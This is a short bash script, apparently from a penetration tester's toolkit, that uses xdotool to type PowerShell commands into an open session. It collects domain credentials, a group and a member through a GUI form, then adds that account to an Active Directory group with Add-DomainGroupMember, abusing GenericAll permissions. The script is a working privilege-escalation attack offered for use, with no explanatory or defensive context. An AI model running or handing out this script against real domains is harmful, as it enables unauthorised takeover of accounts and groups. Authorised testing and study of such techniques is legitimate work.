#!/bin/bash

: '
powershell: genericAll permissions exploit
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Domain\Username" "Password" "Group" "Member"

paste_command "\$SecPassword = ConvertTo-SecureString '${form_data["Password"]}' -AsPlainText -Force"
xdotool key Return
sleep 1.5

paste_command "\$creds = New-Object System.Management.Automation.PSCredential('${form_data["Domain\Username"]}', \$SecPassword)"
xdotool key Return
sleep 1.5


paste_command "\$group = Convert-NameToSid '${form_data["Group"]}'"
xdotool key Return
sleep 1.5

paste_command "Add-DomainGroupMember -Identity \$group -Members '${form_data["Member"]}' -Credential \$creds -verbose"
xdotool key Return
sleep 1.5
